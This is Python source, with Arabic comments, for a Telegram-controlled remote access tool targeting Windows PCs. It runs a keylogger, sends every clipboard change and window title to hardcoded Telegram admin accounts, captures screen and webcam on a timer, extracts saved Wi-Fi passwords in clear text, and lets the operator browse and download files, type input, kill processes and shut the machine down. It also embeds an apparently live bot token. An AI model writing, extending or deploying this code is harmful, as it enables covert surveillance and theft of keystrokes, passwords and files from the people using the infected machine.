import os
import sys
import time
import psutil
import pyautogui
import cv2
import requests
import pyttsx3
import pyperclip
import ctypes
import datetime
import webbrowser
import threading
import subprocess
import platform
import win32gui
import numpy as np
from pynput import keyboard
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ==========================================
# ⚙️ الإعدادات (CONFIGURATION)
# ==========================================

TOKEN = "8500372242:AAFVPMzbH-cciXHkiCpXHH2AXaAMvZzrLa0"
ADMIN_IDS = [1431886140]
DEVICE_ID = "LAPTOP_1"  # ⚠️ غير الاسم لكل جهاز

# مسارات الحفظ
DOWNLOAD_PATH = os.path.join(os.path.expanduser("~"), "Downloads")
CURRENT_PATH = os.getcwd() # للملفات

# متغيرات التحكم
FLAGS = {
    "keylogger": False,
    "auto_screen": False,
    "auto_cam": False,
    "video_rec": False  # للتحكم في الفيديو المستمر
}
LOGGED_KEYS = []
CLIPBOARD_HISTORY = []

# ذاكرة مؤقتة لأسماء الملفات
FILE_CACHE = {} 

# ==========================================
# 🛠️ دوال المساعدة المتزامنة
# ==========================================

def send_sync_msg(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        for admin in ADMIN_IDS:
            requests.post(url, data={"chat_id": admin, "text": text, "parse_mode": "Markdown"})
    except: pass

def send_sync_photo(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        for admin in ADMIN_IDS:
            with open(file_path, 'rb') as f:
                requests.post(url, data={"chat_id": admin, "caption": caption}, files={"photo": f})
    except: pass

def send_sync_doc(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        for admin in ADMIN_IDS:
            with open(file_path, 'rb') as f:
                requests.post(url, data={"chat_id": admin, "caption": caption}, files={"document": f})
    except: pass

# ==========================================
# 🕵️‍♂️ خيوط المراقبة الخلفية
# ==========================================

def auto_monitor_loop():
    """مراقبة تلقائية (شاشة، كاميرا، حافظة، نوافذ)"""
    last_clip = ""
    last_win = ""  
    print("✅ Auto Monitor Thread Started...")
    
    while True:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")

        # 1. مراقبة الحافظة
        try:
            curr_clip = pyperclip.paste()
            if curr_clip and curr_clip != last_clip:
                last_clip = curr_clip
                CLIPBOARD_HISTORY.append(f"[{timestamp}] {curr_clip}")
                if len(CLIPBOARD_HISTORY) > 10: CLIPBOARD_HISTORY.pop(0)
                send_sync_msg(f"📋 **نسخ جديد ({DEVICE_ID}):**\n`{curr_clip}`")
        except: pass

        # 2. مراقبة النافذة النشطة (✅ تم التفعيل)
        try:
            win = win32gui.GetForegroundWindow()
            txt = win32gui.GetWindowText(win)
            # نرسل تنبيه فقط إذا تغيرت النافذة وكان العنوان مفيداً
            if txt and txt != last_win and len(txt) > 2:
                last_win = txt
                send_sync_msg(f"👀 **نشاط جديد:**\nفتح المستخدم: `{txt}`")
        except: pass

        # 3. تصوير الشاشة التلقائي (إذا مفعل)
        if FLAGS["auto_screen"]:
            try:
                path = os.path.join(os.getenv('TEMP'), "auto_scr.png")
                pyautogui.screenshot(path)
                send_sync_photo(path, caption=f"🖥️ Auto Screen: {timestamp}")
                os.remove(path)
            except: pass

        # 4. تصوير الكاميرا التلقائي (إذا مفعل)
        if FLAGS["auto_cam"]:
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    path = os.path.join(os.getenv('TEMP'), "auto_cam.jpg")
                    cv2.imwrite(path, frame)
                    send_sync_photo(path, caption=f"👁️ Auto Cam: {timestamp}")
                    os.remove(path)
                cap.release()
            except: pass

        time.sleep(3) # فحص كل 3 ثواني

def keylogger_loop():
    def on_press(key):
        if FLAGS["keylogger"]:
            try: LOGGED_KEYS.append(key.char)
            except: LOGGED_KEYS.append(f"[{str(key).replace('Key.', '')}]")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=auto_monitor_loop, daemon=True).start()
threading.Thread(target=keylogger_loop, daemon=True).start()

# ==========================================
# 📂 مدير الملفات (بنظام الفهرسة)
# ==========================================

def get_file_keyboard(path):
    global FILE_CACHE
    FILE_CACHE = {} 
    keyboard = []
    
    try:
        items = os.listdir(path)
        keyboard.append([InlineKeyboardButton("⬆️ لأعلى", callback_data="DIR_UP"), InlineKeyboardButton("🏠 الرئيسية", callback_data="DIR_HOME")])
        
        idx = 0
        dirs = [d for d in items if os.path.isdir(os.path.join(path, d))][:5]
        for d in dirs:
            FILE_CACHE[str(idx)] = d
            keyboard.append([InlineKeyboardButton(f"📁 {d}", callback_data=f"NAV|{idx}")])
            idx += 1
            
        files = [f for f in items if os.path.isfile(os.path.join(path, f))][:5]
        for f in files:
            FILE_CACHE[str(idx)] = f
            keyboard.append([InlineKeyboardButton(f"📄 {f}", callback_data=f"DL|{idx}")])
            idx += 1

    except: keyboard.append([InlineKeyboardButton("❌ خطأ في الوصول", callback_data="NONE")])
    return InlineKeyboardMarkup(keyboard)

# ==========================================
# 🎮 القوائم
# ==========================================

main_kb = [
    [KeyboardButton("🖥️ المراقبة"), KeyboardButton("⚡ الطاقة")],
    [KeyboardButton("👻 الشبح"), KeyboardButton("🛡️ الأمان")],
    [KeyboardButton("📂 الملفات"), KeyboardButton("🌐 الشبكة")],
    [KeyboardButton("🚀 الإنتاجية"), KeyboardButton("🛠️ أدوات إضافية")]
]

monitor_kb = [
    [KeyboardButton("📸 لقطة شاشة"), KeyboardButton("👁️ صورة كاميرا")],
    [KeyboardButton("🔴 بدء تسجيل فيديو"), KeyboardButton("⏹ إيقاف التسجيل")], # ✅ أزرار الفيديو المستمر
    [KeyboardButton("⏱️ وقت التشغيل"), KeyboardButton("🔋 البطارية")],
    [KeyboardButton("🔄 تفعيل التصوير التلقائي"), KeyboardButton("⏹ إيقاف التصوير التلقائي")],
    [KeyboardButton("ℹ️ معلومات النظام"), KeyboardButton("🔙 القائمة الرئيسية")]
]

power_kb = [
    [KeyboardButton("🔒 قفل"), KeyboardButton("💤 سكون")],
    [KeyboardButton("🛑 إيقاف التشغيل"), KeyboardButton("🔄 إعادة تشغيل")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

ghost_kb = [
    [KeyboardButton("📩 رسالة منبثقة"), KeyboardButton("🖼️ تغيير خلفية")],
    [KeyboardButton("🔊 التحكم بالصوت"), KeyboardButton("🔙 القائمة الرئيسية")]
]

security_kb = [
    [KeyboardButton("⌨️ تفعيل Keylogger"), KeyboardButton("📝 سحب السجل")],
    [KeyboardButton("🕵️ صورة دخيل"), KeyboardButton("☠️ قتل برنامج")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

files_kb = [
    [KeyboardButton("📂 متصفح الملفات"), KeyboardButton("📋 نسخ الحافظة")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

network_kb = [
    [KeyboardButton("🔐 باسوردات الواي فاي"), KeyboardButton("🔗 اتصال بشبكة")],
    [KeyboardButton("📡 فحص الشبكات المتاحة")],
    [KeyboardButton("🌍 IP عام"), KeyboardButton("🚀 سرعة النت")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

prod_kb = [
    [KeyboardButton("📚 وضع المذاكرة"), KeyboardButton("💻 وضع البرمجة")],
    [KeyboardButton("🚨 زر الطوارئ"), KeyboardButton("🔙 القائمة الرئيسية")]
]

audio_kb = [
    [KeyboardButton("🔊 رفع الصوت"), KeyboardButton("🔉 خفض الصوت")],
    [KeyboardButton("🔇 كتم"), KeyboardButton("🔙 القائمة الرئيسية")]
]

# ==========================================
# 🤖 معالج الأوامر
# ==========================================

def is_admin(uid): return uid in ADMIN_IDS

async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    msg = update.message.text

    if msg in ["/start", "🔙 القائمة الرئيسية"]:
        await update.message.reply_text(f"🕹️ **{DEVICE_ID} Online**", reply_markup=ReplyKeyboardMarkup(main_kb, resize_keyboard=True))
    
    # --- التنقل ---
    elif msg == "🖥️ المراقبة": await update.message.reply_text("👁️ المراقبة", reply_markup=ReplyKeyboardMarkup(monitor_kb, resize_keyboard=True))
    elif msg == "⚡ الطاقة": await update.message.reply_text("⚡ الطاقة", reply_markup=ReplyKeyboardMarkup(power_kb, resize_keyboard=True))
    elif msg == "👻 الشبح": await update.message.reply_text("👻 الشبح", reply_markup=ReplyKeyboardMarkup(ghost_kb, resize_keyboard=True))
    elif msg == "🛡️ الأمان": await update.message.reply_text("🛡️ الأمان", reply_markup=ReplyKeyboardMarkup(security_kb, resize_keyboard=True))
    elif msg == "📂 الملفات": await update.message.reply_text("📂 الملفات", reply_markup=ReplyKeyboardMarkup(files_kb, resize_keyboard=True))
    elif msg == "🌐 الشبكة": await update.message.reply_text("🌐 الشبكة", reply_markup=ReplyKeyboardMarkup(network_kb, resize_keyboard=True))
    elif msg == "🚀 الإنتاجية": await update.message.reply_text("🚀 الإنتاجية", reply_markup=ReplyKeyboardMarkup(prod_kb, resize_keyboard=True))
    elif msg == "🛠️ أدوات إضافية": await update.message.reply_text("🛠️ أدوات", reply_markup=ReplyKeyboardMarkup(audio_kb, resize_keyboard=True)) 
    elif msg == "🔊 التحكم بالصوت": await update.message.reply_text("🔊 الصوت", reply_markup=ReplyKeyboardMarkup(audio_kb, resize_keyboard=True))

    # --- المراقبة ---
    elif msg == "📸 لقطة شاشة":
        path = "scr.png"
        pyautogui.screenshot(path)
        await update.message.reply_photo(open(path, 'rb'))
        os.remove(path)
    elif msg == "👁️ صورة كاميرا":
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("cam.jpg", frame); cap.release()
            await update.message.reply_photo(open("cam.jpg", 'rb')); os.remove("cam.jpg")
        else: await update.message.reply_text("❌ خطأ كاميرا")
    
    # ✅ فيديو مستمر (Start/Stop)
    elif msg == "🔴 بدء تسجيل فيديو":
        if FLAGS["video_rec"]:
            await update.message.reply_text("⚠️ التسجيل يعمل بالفعل!")
        else:
            FLAGS["video_rec"] = True
            await update.message.reply_text("🎥 **تم بدء التسجيل المستمر.**\nاضغط 'إيقاف التسجيل' لإنهاء الفيديو ورفعه.")
            def continuous_rec():
                try:
                    p = os.path.join(os.getenv('TEMP'), "long_rec.avi")
                    fourcc = cv2.VideoWriter_fourcc(*"XVID")
                    out = cv2.VideoWriter(p, fourcc, 10.0, pyautogui.size())
                    while FLAGS["video_rec"]: 
                        img = pyautogui.screenshot()
                        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
                        out.write(frame)
                        time.sleep(0.05) 
                    out.release()
                    send_sync_msg("⏳ جاري رفع الفيديو...")
                    send_sync_doc(p, caption="🎥 تم إنهاء التسجيل.")
                    os.remove(p)
                except Exception as e:
                    send_sync_msg(f"❌ خطأ في الفيديو: {e}")
                    FLAGS["video_rec"] = False
            threading.Thread(target=continuous_rec).start()

    elif msg == "⏹ إيقاف التسجيل":
        if not FLAGS["video_rec"]:
            await update.message.reply_text("⚠️ لا يوجد تسجيل يعمل.")
        else:
            FLAGS["video_rec"] = False
            await update.message.reply_text("🛑 جاري الإيقاف والمعالجة...")

    elif msg == "⏱️ وقت التشغيل":
        upt = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())
        await update.message.reply_text(f"⏱️ Uptime: {str(upt).split('.')[0]}")
    elif msg == "🔄 تفعيل التصوير التلقائي":
        FLAGS["auto_screen"] = True; FLAGS["auto_cam"] = True
        await update.message.reply_text("✅ تم التفعيل.")
    elif msg == "⏹ إيقاف التصوير التلقائي":
        FLAGS["auto_screen"] = False; FLAGS["auto_cam"] = False
        await update.message.reply_text("🛑 تم الإيقاف.")
    elif msg == "ℹ️ معلومات النظام":
        cpu = psutil.cpu_percent(); ram = psutil.virtual_memory().percent
        await update.message.reply_text(f"📊 CPU: {cpu}% | RAM: {ram}%")
    elif msg == "🔋 البطارية":
        bat = psutil.sensors_battery()
        await update.message.reply_text(f"🔋 {bat.percent}%" if bat else "PC")

    # --- الطاقة ---
    elif msg == "🔒 قفل": ctypes.windll.user32.LockWorkStation(); await update.message.reply_text("🔒 Locked.")
    elif msg == "💤 سكون": os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0"); await update.message.reply_text("💤 Sleep.")
    elif msg == "🛑 إيقاف التشغيل": os.system("shutdown /s /t 5"); await update.message.reply_text("🛑 Shutdown in 5s.")
    elif msg == "🔄 إعادة تشغيل": os.system("shutdown /r /t 5"); await update.message.reply_text("🔄 Restart in 5s.")

    # --- الشبح ---
    elif msg == "📩 رسالة منبثقة": await update.message.reply_text("اكتب: `/msg النص`")
    elif msg == "🖼️ تغيير خلفية": await update.message.reply_text("أرسل الصورة مع تعليق `/wallpaper`")

    # --- الأمان ---
    elif msg == "⌨️ تفعيل Keylogger": FLAGS["keylogger"] = True; await update.message.reply_text("✅ Keylogger ON.")
    elif msg == "📝 سحب السجل":
        global LOGGED_KEYS
        if LOGGED_KEYS:
            with open("keys.txt", "w", encoding="utf-8") as f: f.write("".join(LOGGED_KEYS))
            await update.message.reply_document(open("keys.txt", "rb")); os.remove("keys.txt"); LOGGED_KEYS = []
        else: await update.message.reply_text("📭 فارغ.")
    elif msg == "☠️ قتل برنامج": await update.message.reply_text("اكتب: `/kill chrome`")
    elif msg == "🕵️ صورة دخيل": 
        cap = cv2.VideoCapture(0); ret, frame = cap.read()
        if ret:
            cv2.imwrite("int.jpg", frame); cap.release(); await update.message.reply_photo(open("int.jpg", 'rb')); os.remove("int.jpg")
        else: await update.message.reply_text("❌ الكاميرا غير متاحة")

    # --- الملفات ---
    elif msg == "📂 متصفح الملفات":
        global CURRENT_PATH; CURRENT_PATH = os.getcwd()
        await update.message.reply_text(f"📂 `{CURRENT_PATH}`", reply_markup=get_file_keyboard(CURRENT_PATH))
    elif msg == "📋 نسخ الحافظة": await update.message.reply_text(f"📋 `{pyperclip.paste()}`")

    # --- الشبكة ---
    elif msg == "🔐 باسوردات الواي فاي":
        try:
            d = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors='ignore')
            p = [i.split(":")[1][1:-1] for i in d.split('\n') if "All User Profile" in i]
            res = ""
            for i in p:
                try:
                    r = subprocess.check_output(f'netsh wlan show profile name="{i}" key=clear', shell=True).decode('cp850', errors='ignore')
                    k = [b.split(":")[1][1:-1] for b in r.split('\n') if "Key Content" in b]
                    res += f"📡 {i}: {k[0]}\n"
                except: res += f"📡 {i}: (Open)\n"
            await update.message.reply_text(res[:4000])
        except: await update.message.reply_text("❌ خطأ")
    elif msg == "📡 فحص الشبكات المتاحة":
        try:
            res = subprocess.check_output('netsh wlan show networks', shell=True).decode('cp850', errors='ignore')
            await update.message.reply_text(f"📡 الشبكات المتاحة:\n{res}")
        except: await update.message.reply_text("❌ فشل الفحص")
    elif msg == "🔗 اتصال بشبكة": await update.message.reply_text("اكتب: `/connect SSID,PASS`")
    elif msg == "🌍 IP عام": await update.message.reply_text(f"🌐 `{requests.get('https://api.ipify.org').text}`")
    
    # ✅ إصلاح قياس السرعة (باستخدام الطريقة الآمنة)
    elif msg == "🚀 سرعة النت":
        await update.message.reply_text("⏳ جاري قياس السرعة (قد يستغرق دقيقة)...")
        def run_speedtest():
            try:
                import speedtest
                st = speedtest.Speedtest()
                st.get_best_server()
                down = st.download() / 1024 / 1024
                up = st.upload() / 1024 / 1024
                ping = st.results.ping
                res = f"🚀 **نتائج السرعة ({DEVICE_ID}):**\n⬇️ تحميل: {down:.2f} Mbps\n⬆️ رفع: {up:.2f} Mbps\n📶 بنج: {ping:.2f} ms"
                send_sync_msg(res)
            except ImportError:
                send_sync_msg("❌ مكتبة speedtest-cli غير مثبتة.")
            except Exception as e:
                send_sync_msg(f"❌ خطأ: {e}")
        threading.Thread(target=run_speedtest).start()

    # --- الإنتاجية ---
    elif msg == "📚 وضع المذاكرة": webbrowser.open("https://chatgpt.com"); webbrowser.open("https://google.com"); await update.message.reply_text("📚 Study ON")
    elif msg == "💻 وضع البرمجة": os.system("code"); await update.message.reply_text("💻 Coding ON")
    elif msg == "🚨 زر الطوارئ": os.system("taskkill /f /im chrome.exe"); os.system("start winword"); await update.message.reply_text("🚨 PANIC!")

    # --- الصوت ---
    elif msg == "🔊 رفع الصوت": [pyautogui.press('volumeup') for _ in range(5)]; await update.message.reply_text("🔊")
    elif msg == "🔉 خفض الصوت": [pyautogui.press('volumedown') for _ in range(5)]; await update.message.reply_text("🔉")
    elif msg == "🔇 كتم": pyautogui.press('volumemute'); await update.message.reply_text("🔇")

async def file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    data = query.data
    global CURRENT_PATH
    
    # التنقل
    if data == "DIR_UP": CURRENT_PATH = os.path.dirname(CURRENT_PATH)
    elif data == "DIR_HOME": CURRENT_PATH = os.path.expanduser("~")
    
    # الدخول للمجلد
    elif data.startswith("NAV|"):
        idx = data.split("|")[1]
        if idx in FILE_CACHE:
            folder_name = FILE_CACHE[idx]
            new_path = os.path.join(CURRENT_PATH, folder_name)
            if os.path.isdir(new_path): CURRENT_PATH = new_path
            
    # التحميل
    elif data.startswith("DL|"):
        idx = data.split("|")[1]
        if idx in FILE_CACHE:
            file_name = FILE_CACHE[idx]
            try: await query.message.reply_document(open(os.path.join(CURRENT_PATH, file_name), 'rb'))
            except Exception as e: await query.message.reply_text(f"❌ {e}")
        return

    await query.edit_message_text(f"📂 `{CURRENT_PATH}`", reply_markup=get_file_keyboard(CURRENT_PATH))

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    txt = update.message.text

    if txt.startswith("/msg "):
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt.replace("/msg ", ""), "Admin", 0x40 | 0x1000)).start()
        await update.message.reply_text("✅ Sent.")
    elif txt.startswith("/open "): webbrowser.open(txt.replace("/open ", "")); await update.message.reply_text("✅ Opened.")
    elif txt.startswith("/kill "): os.system(f"taskkill /f /im {txt.replace('/kill ', '')}.exe"); await update.message.reply_text("🔪 Killed.")
    elif txt.startswith("/say "): threading.Thread(target=lambda: pyttsx3.speak(txt.replace("/say ", ""))).start(); await update.message.reply_text("🗣️ Spoken.")
    elif txt.startswith("/type "): pyautogui.write(txt.replace("/type ", ""), interval=0.1); await update.message.reply_text("⌨️ Typed.")
    elif txt.startswith("/connect "):
        try:
            creds = txt.replace("/connect ", "").split(",")
            xml = f"""<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{creds[0]}</name><SSIDConfig><SSID><name>{creds[0]}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{creds[1]}</keyMaterial></sharedKey></MSM></MSM></WLANProfile>"""
            with open("w.xml", "w") as f: f.write(xml)
            subprocess.run('netsh wlan add profile filename="w.xml"', shell=True)
            subprocess.run(f'netsh wlan connect name="{creds[0]}"', shell=True)
            os.remove("w.xml"); await update.message.reply_text(f"📡 Connecting to {creds[0]}...")
        except: await update.message.reply_text("❌ Format: /connect SSID,PASS")

async def doc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if update.message.caption and "/wallpaper" in update.message.caption:
        f = await update.message.photo[-1].get_file()
        await f.download_to_drive("bg.jpg")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("bg.jpg"), 0)
        await update.message.reply_text("🖼️ Wallpaper Changed.")

def main():
    print(f"🚀 Monster Bot Active: {DEVICE_ID}")
    
    # ✅ تنبيه التشغيل (Startup Alert) - تمت إضافته هنا
    send_sync_msg(f"🟢 **تم تشغيل الجهاز الآن:** {DEVICE_ID}\n⏰ {datetime.datetime.now().strftime('%I:%M %p')}")

    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CallbackQueryHandler(file_callback))
    app.add_handler(MessageHandler(filters.Regex("^/"), cmd_handler))
    app.add_handler(MessageHandler(filters.PHOTO, doc_handler))
    app.add_handler(MessageHandler(filters.TEXT, menu_handler))
    
    app.run_polling()

if __name__ == '__main__':
    main()